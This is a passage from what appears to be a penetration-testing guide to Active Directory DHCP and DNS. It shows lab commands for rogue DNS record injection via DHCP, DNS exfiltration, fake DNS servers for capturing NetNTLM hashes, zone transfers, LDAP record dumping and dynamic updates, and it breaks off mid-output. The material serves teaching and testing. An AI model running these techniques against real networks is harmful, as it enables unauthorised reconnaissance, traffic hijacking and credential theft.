</span></span><span style="display:flex;"><span>[77] Unknow: [0, 14, 82, 82, 65, 83, 46, 77, 105, 99, 114, 111, 115, 111, 102, 116, 0, 0, 0, 80, 0, 68, 0, 101, 0, 102, 0, 97, 0, 117, 0, 108, 0, 116, 0, 32, 0, 82, 0, 111, 0, 117, 0, 116, 0, 105, 0, 110, 0, 103, 0, 32, 0, 97, 0, 110, 0, 100, 0, 32, 0, 82, 0, 101, 0, 109, 0, 111, 0, 116, 0, 101, 0, 32, 0, 65, 0, 99, 0, 99, 0, 101, 0, 115, 0, 115, 0, 32, 0, 67, 0, 108, 0, 97, 0, 115, 0, 115, 0, 0, 0, 74, 0, 85, 0, 115, 0, 101, 0, 114, 0, 32, 0, 99, 0, 108, 0, 97, 0, 115, 0, 115, 0, 32, 0, 102, 0, 111, 0, 114, 0, 32, 0, 114, 0, 101, 0, 109, 0, 111, 0, 116, 0, 101, 0, 32, 0, 97, 0, 99, 0, 99, 0, 101, 0, 115, 0, 115, 0, 32, 0, 99, 0, 108, 0, 105, 0, 101, 0, 110, 0, 116, 0, 115, 0, 0]
</span></span><span style="display:flex;"><span>[77] Unknow: [0, 15, 66, 79, 79, 84, 80, 46, 77, 105, 99, 114, 111, 115, 111, 102, 116, 0, 0, 40, 0, 68, 0, 101, 0, 102, 0, 97, 0, 117, 0, 108, 0, 116, 0, 32, 0, 66, 0, 79, 0, 79, 0, 84, 0, 80, 0, 32, 0, 67, 0, 108, 0, 97, 0, 115, 0, 115, 0, 0, 0, 58, 0, 85, 0, 115, 0, 101, 0, 114, 0, 32, 0, 99, 0, 108, 0, 97, 0, 115, 0, 115, 0, 32, 0, 102, 0, 111, 0, 114, 0, 32, 0, 66, 0, 79, 0, 79, 0, 84, 0, 80, 0, 32, 0, 67, 0, 108, 0, 105, 0, 101, 0, 110, 0, 116, 0, 115, 0, 0]
</span></span><span style="display:flex;"><span>[252] WPAD: http://isalocal.contoso.local:80/wpad.dat</span></span></code></pre></div>
</div>
<figcaption>
Getting information from the DHCP server
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-dhcp-dynamic-dns" class="outline-4">
<h4 id="dhcp-dynamic-dns">
DHCP Dynamic DNS
</h4>
<div id="outline-text-dhcp-dynamic-dns" class="outline-text-4">
<p>
In Active Directory you can ask (by default) to the DHCP server to <a href="https://www.trustedsec.com/blog/injecting-rogue-dns-records-using-dhcp/">create custom
DNS A records</a> based on the client hostname, that is indicated in the DHCP
request. This can be very useful since you don't need any kind of
authentication/authorization for performing this operation.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; Get-DhcpServerv4DnsSetting
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>DynamicUpdates             <span style="color:#960050;background-color:#1e0010">:</span> OnClientRequest
</span></span><span style="display:flex;"><span>DeleteDnsRROnLeaseExpiry   <span style="color:#960050;background-color:#1e0010">:</span> True
</span></span><span style="display:flex;"><span>UpdateDnsRRForOlderClients <span style="color:#960050;background-color:#1e0010">:</span> False
</span></span><span style="display:flex;"><span>DnsSuffix                  <span style="color:#960050;background-color:#1e0010">:</span>
</span></span><span style="display:flex;"><span>DisableDnsPtrRRUpdate      <span style="color:#960050;background-color:#1e0010">:</span> False
</span></span><span style="display:flex;"><span>NameProtection             <span style="color:#960050;background-color:#1e0010">:</span> False</span></span></code></pre></div>
</div>
<figcaption>
Default configuration of DHCP server
</figcaption>
</figure>
<p>
A client can request a DNS update of DNS A record, it needs to include the
<a href="https://datatracker.ietf.org/doc/html/rfc4702">Client FQDN (Fully Qualified Domain Name) option</a> in the DHCP request with the
"S" <a href="https://datatracker.ietf.org/doc/html/rfc4702#section-2.1">flag</a> set to 1, along with the FQDN or hostname set. The server will return
the same flag set to 1 if the update was done. The new A record will point the
client hostname to the acquired IP address. You can request a DNS update by
using <a href="https://github.com/Zer1t0/dhcplayer#dns-dynamic-update">dhcplayer</a> with the <code>--dns-update</code> flag.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ dhcplayer discover -I eth2 --dns-update -H hira
</span></span><span style="display:flex;"><span>ACK received from 0.0.0.0
</span></span><span style="display:flex;"><span>Acquired IP: 192.168.100.121
</span></span><span style="display:flex;"><span>Client MAC: 52:54:00:88:80:0c
</span></span><span style="display:flex;"><span>Options:
</span></span><span style="display:flex;"><span>[58] Renewal Time: 345600
</span></span><span style="display:flex;"><span>[59] Rebinding Time: 604800
</span></span><span style="display:flex;"><span>[51] IP Address Lease Time: 691200
</span></span><span style="display:flex;"><span>[54] DHCP Server ID: 192.168.100.240
</span></span><span style="display:flex;"><span>[1] Subnet Mask: 255.255.255.0
</span></span><span style="display:flex;"><span>[81] Client FQDN: flags: 0x1 (server-update) A-result: 255 PTR-result: 0 
</span></span><span style="display:flex;"><span>[3] Router: 192.168.100.240
</span></span><span style="display:flex;"><span>[15] Domain Name: poke.mon
</span></span><span style="display:flex;"><span>[6] Domain Server: 192.168.100.240,192.168.100.240,192.168.100.2
</span></span><span style="display:flex;"><span>                                                                                                                
</span></span><span style="display:flex;"><span>$ nslookup hira.poke.mon 192.168.100.240                                                               
</span></span><span style="display:flex;"><span>Server:		192.168.100.240
</span></span><span style="display:flex;"><span>Address:	192.168.100.240#53
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Name:	hira.poke.mon
</span></span><span style="display:flex;"><span>Address: 192.168.100.121</span></span></code></pre></div>
</div>
<figcaption>
Dynamic DNS update with dhcplayer
</figcaption>
</figure>
<p>
Since the DHCP will usually assign the same address to the same client (based on
the client MAC), you can change the DNS record with multiple requests with
different hostnames. Also, if no hostname is given, the DNS record will be
deleted. It also will the delete when the DHCP lease expires.</p>
<p>
However, there are certain <a href="https://www.netspi.com/blog/technical/network-penetration-testing/adidns-revisited/">DNS names that are protected</a> by the DNS Global Query
Block List (GQBL) from being resolved even if you add a DNS record. By default
those are <code class="verbatim">wpad</code> and <code class="verbatim">isatap</code>.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; Get-DnsServerGlobalQueryBlockList
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Enable <span style="color:#960050;background-color:#1e0010">:</span> True
</span></span><span style="display:flex;"><span>List   <span style="color:#960050;background-color:#1e0010">:</span> {wpad, isatap}</span></span></code></pre></div>
</div>
<figcaption>
Get DNS Global Query Block List
</figcaption>
</figure>
</div>
</div>
</div>
</div>
<div id="outline-container-dns" class="outline-3">
<h3 id="dns">
DNS
</h3>
<div id="outline-text-dns" class="outline-text-3">
<div id="outline-container-dns-basics" class="outline-4">
<h4 id="dns-basics">
DNS Basics
</h4>
<div id="outline-text-dns-basics" class="outline-text-4">
<p>
DNS (Domain Name System) is a system that defines hierarchical names for
computer, services and other resources of the network. The DNS protocol is a
client/server protocol in which the server listens on ports 53/UDP and 53/TCP.</p>
<figure>
<pre class="example">          .---
 DNS ---&gt; | 53/UDP|TCP
          '---
</pre>
<figcaption>
DNS ports
</figcaption>
</figure>
<p>
DNS in mainly used to resolve the DNS name of a computer to its IP
address.</p>
<figure>
<pre class="example">    client                     DNS server
    .---.   A hackliza.gal?     .---.
   /   /| ------------------&gt;  /   /|
  .---. |                     .---. |
  |   | '   185.199.111.153   |   | '
  |   |/  &lt;------------------ |   |/ 
  '---'                       '---'
</pre>
<figcaption>
DNS query to resolve name
</figcaption>
</figure>
<p>
Apart from resolve names, DNS allows to perform other actions like mapping an
IP to its name or resolving the aliases for a name. The client can perform
different queries that the server will try to answer. In order to do this, the
DNS servers keeps a collection of <a href="https://en.wikipedia.org/wiki/List_of_DNS_record_types">different records</a>. Some types of records are
the following:</p>
<ul>
<li>A: Maps a DNS name to an IPv4.</li>
<li>AAAA: Maps a DNS name to an IPv6.</li>
<li>CNAME (Canonical Name): Maps a DNS name known as alias to the original DNS
name.</li>
<li>DNAME: Maps a DNS subtree.</li>
<li>NS (Name Server): Indicate a DNS server for a domain.</li>
<li>PTR (Pointer): Maps an IP address to a DNS name (reverse lookup).</li>
<li>SOA (Start of Authority): Contains administrative information about the DNS
zone, such as the main DNS server or the mail of the administrator.</li>
<li>SRV (Service): Indicates the host and port of a service.</li>
</ul>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@debian10:~$ dig NS wikipedia.org
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>; &lt;&lt;&gt;&gt; DiG 9.16.6-Ubuntu &lt;&lt;&gt;&gt; NS wikipedia.org
</span></span><span style="display:flex;"><span>;; global options: +cmd
</span></span><span style="display:flex;"><span>;; Got answer:
</span></span><span style="display:flex;"><span>;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 56753
</span></span><span style="display:flex;"><span>;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>;; OPT PSEUDOSECTION:
</span></span><span style="display:flex;"><span>; EDNS: version: 0, flags:; udp: 65494
</span></span><span style="display:flex;"><span>;; QUESTION SECTION:
</span></span><span style="display:flex;"><span>;wikipedia.org.			IN	NS
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>;; ANSWER SECTION:
</span></span><span style="display:flex;"><span>wikipedia.org.		6704	IN	NS	ns1.wikimedia.org.
</span></span><span style="display:flex;"><span>wikipedia.org.		6704	IN	NS	ns0.wikimedia.org.
</span></span><span style="display:flex;"><span>wikipedia.org.		6704	IN	NS	ns2.wikimedia.org.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>;; Query time: 0 msec
</span></span><span style="display:flex;"><span>;; SERVER: 127.0.0.53#53(127.0.0.53)
</span></span><span style="display:flex;"><span>;; WHEN: jue dic 03 10:14:07 CET 2020
</span></span><span style="display:flex;"><span>;; MSG SIZE  rcvd: 106</span></span></code></pre></div>
</div>
<figcaption>
Resolve DNS servers of wikipedia.org with dig
</figcaption>
</figure>
<p>
All of this records can be maintained by a DNS server (usually in a <a href="https://docs.fedoraproject.org/en-US/Fedora/12/html/Deployment_Guide/s2-bind-zone-examples.html">text file</a>)
in order to provide information for its DNS zone.</p>
</div>
</div>
<div id="outline-container-dns-zones" class="outline-4">
<h4 id="dns-zones">
DNS zones
</h4>
<div id="outline-text-dns-zones" class="outline-text-4">
<p>
DNS is hierarchical and it is divided in
zones. Each zone keeps the records for a domain and its subdomains, with the
exception of those subdomains that have their own zones. For example the contoso
company could have the two following zones:</p>
<figure>
<pre class="example">contoso.com
mail.contoso.com
www.contoso.com
</pre>
<figcaption>
Zone contoso.com
</figcaption>
</figure>
<figure>
<pre class="example">internal.contoso.com
it.internal.contoso.com
admin.internal.contoso.com
hr.internal.contoso.com
</pre>
<figcaption>
Zone internal.contoso.com
</figcaption>
</figure>
<p>
Each DNS zone is managed independently. This way it is easier to keep an order
of the records. There are many different DNS zones all over the internet, each
one for different domains and organizations. Therefore, DNS servers needs to
communicate among them in order to provide information of other zones. For
example, if you want to know the <code class="verbatim">www.contoso.com</code> IP address, your DNS server
needs to communicate with contoso authoritative DNS server, that manages the
contoso.com zone, in order to retrieve this information.</p>
</div>
</div>
<div id="outline-container-dns-exfiltration" class="outline-4">
<h4 id="dns-exfiltration">
DNS exfiltration
</h4>
<div id="outline-text-dns-exfiltration" class="outline-text-4">
<p>
This way, the DNS protocol can be an excellent ally as
<a href="https://blogs.akamai.com/2017/09/introduction-to-dns-data-exfiltration.html">exfiltration mechanism</a>. There are certain situations where a server is in an
isolated network and has no access to the internet, but it is allowed to perform
DNS queries in order to work properly. If the local DNS server is misconfigured
and performs recursive DNS requests to other DNS servers in the internet, this
can be abused to bypass firewall rules and sending data to the outside.</p>
<figure>
<pre class="example">                             local recursive           fake.com authoritative
    client                     DNS server                   DNS server
    .---.                        .---.                        .---.         
   /   /|  websvr01.fake.com?   /   /|  websvr01.fake.com?   /   /|
  .---. | --------local------&gt; .---. | ------internet-----&gt; .---. |
  |   | '                      |   | '                      |   | '
  |   |/    40.113.200.201     |   |/    40.113.200.201     |   |/
  '---'   &lt;------------------- '---'   &lt;------------------- '---'
</pre>
<figcaption>
Recursive DNS query
</figcaption>
</figure>
<p>
For example, in case of possesing a DNS server for the domain <code>fake.com</code>, all
the DNS queries for <code>fake.com</code> and its subdomains will reach our server. For
example, if we want to exfiltrate the name of the isolated server, we can use it
as subdomain and querying <code>websvr01.fake.com</code>. This query should pass through
the local DNS server and reach our DNS server in the internet. To take advantage
of this type of technique we can use a tool like <a href="https://github.com/yarrick/iodine">iodine</a> or <a href="https://github.com/iagox86/dnscat2">dnscat2</a>.</p>
</div>
</div>
<div id="outline-container-fake-dns-server" class="outline-4">
<h4 id="fake-dns-server">
Fake DNS server
</h4>
<div id="outline-text-fake-dns-server" class="outline-text-4">
<p>
Moreover, since DNS is so important to manage the resources of a network, it
could be very useful to setup a fake DNS server, by using techniques like a
rogue DHCP server]].</p>
<p>
With a fake DNS server we could redirect the requests of clients to a machines
of our control in order to recolect NetNTLM hashes or just sniffing the network
waiting for sensitive information that travels unprotected. We can use tools
like <a href="irc:https://github.com/iphelix/dnschef">dnschef</a> or <a href="https://github.com/lgandx/Responder">responder.py</a> to create a fake DNS server.</p>
<figure>
<div class="src src-bash">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ dnschef -i 192.168.100.44 --fakeip 192.168.100.44
</span></span><span style="display:flex;"><span>          _                _          __  
</span></span><span style="display:flex;"><span>         | | version 0.4  | |        / _| 
</span></span><span style="display:flex;"><span>       __| |_ __  ___  ___| |__   ___| |_ 
</span></span><span style="display:flex;"><span>      / _<span style="color:#e6db74">`</span> | <span style="color:#e6db74">'_ \/ __|/ __| '</span>_ <span style="color:#ae81ff">\ </span>/ _ <span style="color:#ae81ff">\ </span> _|
</span></span><span style="display:flex;"><span>     | <span style="color:#f92672">(</span>_| | | | <span style="color:#ae81ff">\_</span>_ <span style="color:#ae81ff">\ </span><span style="color:#f92672">(</span>__| | | |  __/ |  
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">\_</span>_,_|_| |_|___/<span style="color:#ae81ff">\_</span>__|_| |_|<span style="color:#ae81ff">\_</span>__|_|  
</span></span><span style="display:flex;"><span>                   iphelix@thesprawl.org  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>12:29:51<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DNSChef started on interface: 192.168.100.44
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>12:29:51<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using the following nameservers: 8.8.8.8
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>12:29:51<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cooking all A replies to point to 192.168.100.44
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>12:38:32<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.100.7: proxying the response of type <span style="color:#e6db74">'PTR'</span> <span style="color:#66d9ef">for</span> 44.100.168.192.in-addr.arpa
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>12:38:32<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.100.7: cooking the response of type <span style="color:#e6db74">'A'</span> <span style="color:#66d9ef">for</span> aaa.contoso.local to 192.168.100.44
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>12:38:32<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.100.7: proxying the response of type <span style="color:#e6db74">'AAAA'</span> <span style="color:#66d9ef">for</span> aaa.contoso.local</span></span></code></pre></div>
</div>
<figcaption>
Fake DNS server with dnschef
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-dns-zone-transfer" class="outline-4">
<h4 id="dns-zone-transfer">
DNS Zone Transfer
</h4>
<div id="outline-text-dns-zone-transfer" class="outline-text-4">
<p>
Other interesting thing related with the zones management are the zone
transfers. Zone transfers are used to replicate all the records of a DNS server
into another DNS server, thus allow to keep updated both servers. However, in
some cases a DNS server is misconfigured and allows to anyone to perform zone
transfers.</p>
<p>
In case of Active Directory, DNS zone transfers are not required to replicate
DNS records between DCs (which are usually the DNS servers). However, they can be
enabled in order to allow other DNS servers to replicate the DNS information.</p>
<p>
The zone transfers can be configured by zone and DC, which means that maybe just
one DC allows to perform the zone transfer whereas the rest of DCs refuse the
zone transfer. In case of a misconfigured DC, anyone could perform zone
transfers, thus recolecting all the DNS information without require any
credentials. The followings commands can be used to carry out a DNS zone
transfer:</p>
<ul>
<li>Linux: <code>dig axfr &lt;DNSDomainName&gt; @&lt;DCAddress&gt;</code></li>
<li>Windows: interactive <code>nslookup</code> <code>ls -d &lt;DNSDomainName&gt;</code></li>
</ul>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@debian10:~# dig axfr contoso.local @dc01.contoso.local
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+deb10u2-Debian &lt;&lt;&gt;&gt; axfr contoso.local @dc01.contoso.local
</span></span><span style="display:flex;"><span>;; global options: +cmd
</span></span><span style="display:flex;"><span>contoso.local.		3600	IN	SOA	dc01.contoso.local. hostmaster.contoso.local. 156 900 600 86400 3600
</span></span><span style="display:flex;"><span>contoso.local.		600	IN	A	192.168.100.3
</span></span><span style="display:flex;"><span>contoso.local.		600	IN	A	192.168.100.2
</span></span><span style="display:flex;"><span>contoso.local.		3600	IN	NS	dc01.contoso.local.
</span></span><span style="display:flex;"><span>contoso.local.		3600	IN	NS	dc02.contoso.local.
</span></span><span style="display:flex;"><span>_gc._tcp.Default-First-Site-Name._sites.contoso.local. 600 IN SRV 0 100 3268 dc02.contoso.local.
</span></span><span style="display:flex;"><span>_gc._tcp.Default-First-Site-Name._sites.contoso.local. 600 IN SRV 0 100 3268 dc01.contoso.local.
</span></span><span style="display:flex;"><span>_kerberos._tcp.Default-First-Site-Name._sites.contoso.local. 600 IN SRV	0 100 88 dc02.contoso.local.
</span></span><span style="display:flex;"><span>......................stripped output..................</span></span></code></pre></div>
</div>
<figcaption>
Zone transfer from DC with dig
</figcaption>
</figure>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PS C:\&gt; nslookup
</span></span><span style="display:flex;"><span>Default Server:  UnKnown
</span></span><span style="display:flex;"><span>Address:  192.168.100.2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&gt; server dc01.contoso.local
</span></span><span style="display:flex;"><span>Default Server:  dc01.contoso.local
</span></span><span style="display:flex;"><span>Addresses:  192.168.100.2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&gt; ls -d contoso.local
</span></span><span style="display:flex;"><span>[UnKnown]
</span></span><span style="display:flex;"><span> contoso.local.                 SOA    dc01.contoso.local hostmaster.contoso.local. (159 900 600 86400 3600)
</span></span><span style="display:flex;"><span> contoso.local.                 A      192.168.100.3
</span></span><span style="display:flex;"><span> contoso.local.                 A      192.168.100.2
</span></span><span style="display:flex;"><span> contoso.local.                 NS     dc02.contoso.local
</span></span><span style="display:flex;"><span> contoso.local.                 NS     dc01.contoso.local
</span></span><span style="display:flex;"><span> _gc._tcp.Default-First-Site-Name._sites SRV    priority=0, weight=100, port=3268, dc02.contoso.local
</span></span><span style="display:flex;"><span> _gc._tcp.Default-First-Site-Name._sites SRV    priority=0, weight=100, port=3268, dc01.contoso.local
</span></span><span style="display:flex;"><span> _kerberos._tcp.Default-First-Site-Name._sites SRV    priority=0, weight=100, port=88, dc02.contoso.local
</span></span><span style="display:flex;"><span>......................stripped output..................</span></span></code></pre></div>
</div>
<figcaption>
Zone transfer from DC with nslookup
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-dump-dns-records" class="outline-4">
<h4 id="dump-dns-records">
Dump DNS records
</h4>
<div id="outline-text-dump-dns-records" class="outline-text-4">
<p>
Furthermore, even if zone transfers are not allowed, due to DNS records are
stored in the Active Directory database, they can be read by using LDAP. Thus,
any domain user can use the LDAP protocol to dump all the DNS records. For this
purpose, the <a href="https://github.com/dirkjanm/adidnsdump">adidnsdump</a> tool can be used (saves the results in <code class="verbatim">records.csv</code>) or
the <a href="https://github.com/mmessano/PowerShell/blob/master/dns-dump.ps1">dns-dump.ps1</a> script.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@debian10:~# adidnsdump -u contoso\\Anakin contoso.local
</span></span><span style="display:flex;"><span>Password: 
</span></span><span style="display:flex;"><span>[-] Connecting to host...
</span></span><span style="display:flex;"><span>[-] Binding to host
</span></span><span style="display:flex;"><span>[+] Bind OK
</span></span><span style="display:flex;"><span>[-] Querying zone for records
</span></span><span style="display:flex;"><span>[+] Found 37 records
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root@debian10:~# head records.csv 
</span></span><span style="display:flex;"><span>type,name,value
</span></span><span style="display:flex;"><span>A,WS02-7,192.168.100.7
</span></span><span style="display:flex;"><span>A,ws01-10,192.168.100.6
</span></span><span style="display:flex;"><span>A,WIN-LBB9AO5FA13,192.168.100.6
</span></span><span style="display:flex;"><span>A,win-4l1775e9t3u,192.168.100.2
</span></span><span style="display:flex;"><span>A,ForestDnsZones,192.168.100.3
</span></span><span style="display:flex;"><span>A,ForestDnsZones,192.168.122.254
</span></span><span style="display:flex;"><span>A,ForestDnsZones,192.168.100.2
</span></span><span style="display:flex;"><span>A,ForestDnsZones,192.168.122.111
</span></span><span style="display:flex;"><span>A,DomainDnsZones,192.168.100.3</span></span></code></pre></div>
</div>
<figcaption>
Dumping DNS with adidnsdump
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-adidns" class="outline-4">
<h4 id="adidns">
ADIDNS
</h4>
<div id="outline-text-adidns" class="outline-text-4">
<p>
Therefore, DNS is a pretty useful protocol, and of course, is used in
Active Directory. The Active Directory implementation is ADIDNS (Active
Directory Integrated DNS), where the role of DNS servers is mainly assumed by
the DCs (Domain Controllers), since their databases contains the DNS names of
the computers in the domain and the rest of DNS records. In Active Directory,
the DNS is the preferred method to resolve names. The order of preference of
resolving protocols is:</p>
<ol>
<li>DNS</li>
<li>mDNS</li>
<li>LLMNR</li>
<li>NBNS</li>
</ol>
<p>ADIDNS works similar to any other DNS implementations, but includes some special
characteristics.</p>
<p>
The main difference with other implementations is that DNS records are
maintained in the Active Directory database, instead of using a text file. In
this way DNS records are integrated like any other object, and take the
advantage of Active Directory Domain Services such as automatic replication
without requiring DNS zone transfers.</p>
<p>
There DNS records can be stored in one of the following locations in the
database:</p>
<ul>
<li>DomainDnsZones partition: This partition is replicated in the DCs of the
domain. Records can be accessed through LDAP in the route
<code>CN=MicrosoftDNS,DC=DomainDnsZones,DC=&lt;domainpart&gt;,DC=&lt;domainpart&gt;</code>.</li>
<li>ForestDnsZones partition: This partition is replicated in all the DCs in the
forest. Records can be accessed through LDAP in the route
<code>CN=MicrosoftDNS,DC=DomainDnsZones,DC=&lt;domainpart&gt;,DC=&lt;domainpart&gt;</code>.</li>
<li>Domain partition: In legacy systems, the DNS records where stored in this
partition that it is replicated in the DCs of the domain. Records can be
accessed through LDAP in the route
<code>CN=MicrosoftDNS,CN=System,DC=&lt;domainpart&gt;,DC=&lt;domainpart&gt;</code>.</li>
</ul>
<p>For example, to access the DomainDnsZones partition through LDAP in
<code class="verbatim">contoso.local</code>, the route would be
<code>CN=MicrosoftDNS,DC=DomainDnsZones,DC=contoso,DC=local</code>.</p>
<p>
As one of the special characteristics, apart from the usual DNS records, ADIDNS
maintains <a href="https://petri.com/active_directory_srv_records">special SRV records</a> that allows to find certain resources in the
network. This allows us to identify the DCs by querying to one of the following
SRV records:</p>
<ul>
<li><code>_gc._tcp.&lt;DNSSDomainName&gt;</code> </li>
<li><code>_kerberos._tcp.&lt;DNSSDomainName&gt;</code></li>
<li><code>_kerberos._udp.&lt;DNSSDomainName&gt;</code></li>
<li><code>_kpasswd._tcp.&lt;DNSSDomainName&gt;</code> </li>
<li><code>_kpasswd._udp.&lt;DNSSDomainName&gt;</code> </li>
<li><code>_ldap._tcp.&lt;DNSSDomainName&gt;</code></li>
<li><code>_ldap._tcp.dc._msdcs.&lt;DNSDomainName&gt;</code></li>
</ul>
<p>These records points to servers that provides Global Catalog (_gc), Kerberos
(_kerberos and _kpasswd) and LDAP (_ldap) services in Active Directory, which
are the Domain Controllers.</p>
<p>
For example, you can get the DCs of <code class="verbatim">contoso.local</code> from Windows with 
<code>nslookup -q=srv _ldap._tcp.dc._msdcs.contoso.local</code> and from Linux with 
<code>dig SRV _ldap._tcp.dc.contoso.local</code>.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PS C:\&gt; nslookup -q=srv _ldap._tcp.contoso.local
</span></span><span style="display:flex;"><span>Server:  ip6-localhost
</span></span><span style="display:flex;"><span>Address:  ::1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>_ldap._tcp.contoso.local        SRV service location:
</span></span><span style="display:flex;"><span>          priority       = 0
</span></span><span style="display:flex;"><span>          weight         = 100
</span></span><span style="display:flex;"><span>          port           = 389
</span></span><span style="display:flex;"><span>          svr hostname   = dc01.contoso.local
</span></span><span style="display:flex;"><span>_ldap._tcp.contoso.local        SRV service location:
</span></span><span style="display:flex;"><span>          priority       = 0
</span></span><span style="display:flex;"><span>          weight         = 100
</span></span><span style="display:flex;"><span>          port           = 389
</span></span><span style="display:flex;"><span>          svr hostname   = dc02.contoso.local
</span></span><span style="display:flex;"><span>dc01.contoso.local      internet address = 192.168.100.2
</span></span><span style="display:flex;"><span>dc02.contoso.local      internet address = 192.168.100.6</span></span></code></pre></div>
</div>
<figcaption>
DNS query to identify DCs with nslookup
</figcaption>
</figure>
<p>
It is also posible to get the IPs of DCs by resolving the domain name
<code>&lt;DNSDomainName&gt;</code>. Additionally, the primary DC can be discovered by querying to
<code>_ldap._tcp.pdc._msdcs.&lt;DNSDomainName&gt;</code>.</p>
</div>
</div>
<div id="outline-container-dns-dynamic-updates" class="outline-4">
<h4 id="dns-dynamic-updates">
DNS dynamic updates
</h4>
<div id="outline-text-dns-dynamic-updates" class="outline-text-4">
<p>
Other interesting mechanism in DNS are the <a href="https://www.ietf.org/rfc/rfc2136.txt">dynamic updates</a>. Dynamic updates
allows clients to create/modify/delete DNS records. In Active Directory by
default only secured dynamic updates are allowed. This means that DNS records
are protected by <a href="#acls">ACLs</a> and only authorized users can modify then.</p>
<p>
By default any user can create a new DNS record (the user becomes its
owner) and only the owner can update or delete the DNS record. Therefore,
access is denied if an user wants to create a DNS record that already exists.
To create new DNS records through DNS dynamic updates the script
<a href="https://github.com/Kevin-Robertson/Powermad#invoke-dnsupdate">Invoke-DNSUpdate</a>.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; Invoke-DNSUpdate -DNSType A -DNSName test -DNSData <span style="color:#ae81ff">192.168</span>.100.100 -Verbose
</span></span><span style="display:flex;"><span>VERBOSE<span style="color:#960050;background-color:#1e0010">:</span> [+] Domain Controller = dc01.contoso.local
</span></span><span style="display:flex;"><span>VERBOSE<span style="color:#960050;background-color:#1e0010">:</span> [+] Domain = contoso.local
</span></span><span style="display:flex;"><span>VERBOSE<span style="color:#960050;background-color:#1e0010">:</span> [+] Kerberos Realm = contoso.local
</span></span><span style="display:flex;"><span>VERBOSE<span style="color:#960050;background-color:#1e0010">:</span> [+] DNS Zone = contoso.local
</span></span><span style="display:flex;"><span>VERBOSE<span style="color:#960050;background-color:#1e0010">:</span> [+] TKEY name <span style="color:#ae81ff">676</span>-ms-<span style="color:#ae81ff">7.1</span>-<span style="color:#ae81ff">0967.05293487</span>-<span style="color:#ae81ff">9821</span>-<span style="color:#ae81ff">11e7</span>-<span style="color:#ae81ff">4051</span>-000c296694e0
